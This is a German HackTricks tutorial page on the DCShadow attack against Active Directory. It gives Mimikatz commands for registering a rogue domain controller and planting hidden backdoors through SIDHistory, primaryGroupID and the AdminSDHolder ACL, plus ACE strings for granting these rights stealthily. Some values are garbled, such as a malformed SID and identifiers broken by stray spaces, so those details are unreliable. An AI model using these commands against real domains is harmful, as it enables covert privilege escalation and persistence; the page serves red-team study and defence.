<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **GitHub-Repositories** senden.

</details>


# DCShadow

Es registriert einen **neuen Domänencontroller** in der AD und verwendet ihn, um Attribute (SIDHistory, SPNs...) auf angegebenen Objekten **ohne** das Hinterlassen von **Protokollen** bezüglich der **Änderungen** zu **ändern**. Sie benötigen DA-Berechtigungen und müssen sich innerhalb der **Stamm-Domäne** befinden.\
Beachten Sie, dass bei Verwendung falscher Daten ziemlich unschöne Protokolle angezeigt werden.

Um den Angriff durchzuführen, benötigen Sie 2 Instanzen von Mimikatz. Eine davon startet die RPC-Server mit SYSTEM-Berechtigungen (Sie müssen hier die gewünschten Änderungen angeben), und die andere Instanz wird verwendet, um die Werte zu ändern:

{% code title="mimikatz1 (RPC-Server)" %}
```bash
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```
{% code title="mimikatz2 (push) - Benötigt DA oder ähnliches" %}
```bash
lsadump::dcshadow /push
```
{% endcode %}

Beachten Sie, dass **`elevate::token`** in der `mimikatz1`-Sitzung nicht funktioniert, da dies die Berechtigungen des Threads erhöht, aber wir müssen die **Berechtigung des Prozesses** erhöhen.\
Sie können auch ein "LDAP"-Objekt auswählen: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Sie können die Änderungen von einem DA oder von einem Benutzer mit diesen minimalen Berechtigungen durchführen:

* Im **Domänenobjekt**:
* _DS-Install-Replica_ (Hinzufügen/Entfernen von Replikaten in der Domäne)
* _DS-Replication-Manage-Topology_ (Verwalten der Replikationstopologie)
* _DS-Replication-Synchronize_ (Replikationssynchronisierung)
* Das **Sites-Objekt** (und seine Untergeordneten) im **Konfigurationscontainer**:
* _CreateChild und DeleteChild_
* Das Objekt des **Computers, der als DC registriert ist**:
* _WriteProperty_ (nicht Schreiben)
* Das **Zielobjekt**:
* _WriteProperty_ (nicht Schreiben)

Sie können [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) verwenden, um einem unprivilegierten Benutzer diese Berechtigungen zu geben (beachten Sie, dass dadurch einige Protokolle erstellt werden). Dies ist viel restriktiver als DA-Berechtigungen zu haben.\
Beispiel: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Das bedeutet, dass der Benutzername _**student1**_, wenn er sich an der Maschine _**mcorp-student1**_ anmeldet, DCShadow-Berechtigungen über das Objekt _**root1user**_ hat.

## Verwendung von DCShadow zum Erstellen von Hintertüren

{% code title="Enterprise Admins in SIDHistory auf einen Benutzer setzen" %}
```bash
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```
{% code title="Ändern der PrimaryGroupID (Benutzer als Mitglied der Domänenadministratoren eintragen)" %}
```bash
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```
{% code title="Ändern Sie den ntSecurityDescriptor von AdminSDHolder (geben Sie einem Benutzer Vollzugriff)" %}
```bash
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
{% endcode %}

## Shadowception - DCShadow-Berechtigungen mit DCShadow (keine geänderten Berechtigungsprotokolle)

Wir müssen folgende ACEs mit der SID unseres Benutzers anhängen:

* Am Domänenobjekt:
* `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;BenutzerSID)`
* `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;BenutzerSID)`
* `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;BenutzerSID)`
* Am Objekt des Angreifercomputers: `(A;;WP;;;BenutzerSID)`
* Am Zielbenutzerobjekt: `(A;;WP;;;BenutzerSID)`
* Am Objekt "Sites" im Konfigurationscontainer: `(A;CI;CCDC;;;BenutzerSID)`

Um die aktuellen ACEs eines Objekts zu erhalten: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

Beachten Sie, dass Sie in diesem Fall **mehrere Änderungen** vornehmen müssen, nicht nur eine. Verwenden Sie daher in der **mimikatz1-Sitzung** (RPC-Server) den Parameter **`/stack` mit jeder gewünschten Änderung**. Auf diese Weise müssen Sie nur einmal **`/push`** ausführen, um alle gestapelten Änderungen im Rogue-Server durchzuführen.



[**Weitere Informationen zu DCShadow auf ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)


<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Weitere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
